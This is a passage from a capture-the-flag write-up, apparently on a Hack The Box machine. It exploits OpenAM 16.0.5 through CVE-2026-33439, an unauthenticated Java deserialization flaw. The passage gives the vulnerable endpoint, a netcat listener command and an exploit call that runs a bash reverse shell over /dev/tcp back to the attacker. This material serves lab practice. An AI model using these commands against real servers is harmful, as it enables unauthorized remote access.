We get a login page and can see that it is running OpenAM.

Looking into it a bit more, we find that the OpenAM version is 16.0.5.

After some searching, we find CVE-2026–33439, a critical pre-authentication Remote Code Execution (RCE) vulnerability affecting OpenAM 16.0.5 and earlier.

The vulnerability is caused by unsafe Java deserialization in the jato.clientSession parameter.

An attacker can send a specially crafted serialized Java object to a vulnerable JATO endpoint and execute commands on the server without needing to authenticate first.

Since our target is running version 16.0.5, it should be vulnerable, so let’s try exploiting it.

We found a PoC for CVE-2026–33439.

Looking through the exploit, we can see that it tests multiple OpenAM UI endpoints, including /ui/PWResetUserValidation.

Since we already know that OpenAM is running under the /openam path, we tested

<https://sso.management.htb/openam/ui/PWResetUserValidation>
This endpoint successfully accepted the JATO payload, so we can use it to attempt command execution on the target.

First, we set up a listener on our attacking machine

nc -lnvp 4444
Then we run the exploit, telling it to execute a reverse shell back to our machine.

python3 Exploit_CVE_2026_33439.py \
  --url '<https://sso.management.htb/openam>' \
  --jars ./Jars \
  --endpoint /ui/PWResetUserValidation \
  --command 'bash -i >& /dev/tcp/<your ip>/4444 0>&1'
If everything works, we should get a connection back in our Netcat listener and land in a shell on the target as the openam user

